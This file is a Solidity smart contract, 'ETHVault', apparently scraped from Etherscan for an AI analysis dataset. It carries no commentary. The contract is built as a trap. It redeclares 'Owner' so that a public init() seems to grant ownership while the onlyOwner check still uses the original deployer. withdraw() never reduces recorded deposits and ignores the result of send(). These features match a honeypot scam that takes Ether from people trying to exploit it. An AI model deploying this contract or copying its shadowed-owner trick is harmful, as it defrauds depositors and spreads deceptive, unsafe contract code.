/**********************************************************************
*These solidity codes have been obtained from Etherscan for extracting
*the smartcontract related info.
*The data will be used by MATRIX AI team as the reference basis for
*MATRIX model analysis,extraction of contract semantics,
*as well as AI based data analysis, etc.
**********************************************************************/
pragma solidity ^0.4.10;

contract Owned {
    address public Owner;
    function Owned() { Owner = msg.sender; }
    modifier onlyOwner { if( msg.sender == Owner ) _; }
}

contract ETHVault is Owned {
    address public Owner;
    mapping (address=>uint) public deposits;
    
    function init() { Owner = msg.sender; }
    
    function() payable { deposit(); }
    
    function deposit() payable {
        if( msg.value >= 100 finney )
            deposits[msg.sender] += msg.value;
        else throw;
    }
    
    function withdraw(uint amount) onlyOwner {
        uint max = deposits[msg.sender];
        if( amount <= max && max > 0 )
            msg.sender.send(amount);
    }
    
    function kill() onlyOwner {
        require(this.balance == 0);
        suicide(msg.sender);
    }
}